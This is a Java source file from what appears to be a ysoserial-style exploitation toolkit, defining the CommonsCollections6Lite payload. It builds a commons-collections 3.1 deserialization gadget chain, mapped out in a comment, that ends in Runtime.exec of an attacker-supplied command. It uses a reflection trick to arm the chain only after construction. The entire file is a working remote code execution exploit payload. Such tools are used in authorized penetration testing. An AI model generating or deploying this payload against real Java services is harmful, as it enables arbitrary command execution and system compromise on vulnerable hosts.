package me.gv7.woodpecker.yso.payloads;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.custom.CommonsCollectionsUtil;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
java.util.HashMap.readObject()
java.util.HashMap.hash()
    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
        org.apache.commons.collections.map.LazyMap.get()
            org.apache.commons.collections.functors.ChainedTransformer.transform()
            org.apache.commons.collections.functors.InvokerTransformer.transform()
                java.lang.reflect.Method.invoke()
                    java.lang.Runtime.exec()
 */
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
public class CommonsCollections6Lite implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        return expMap;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6Lite.class, args);
    }
}
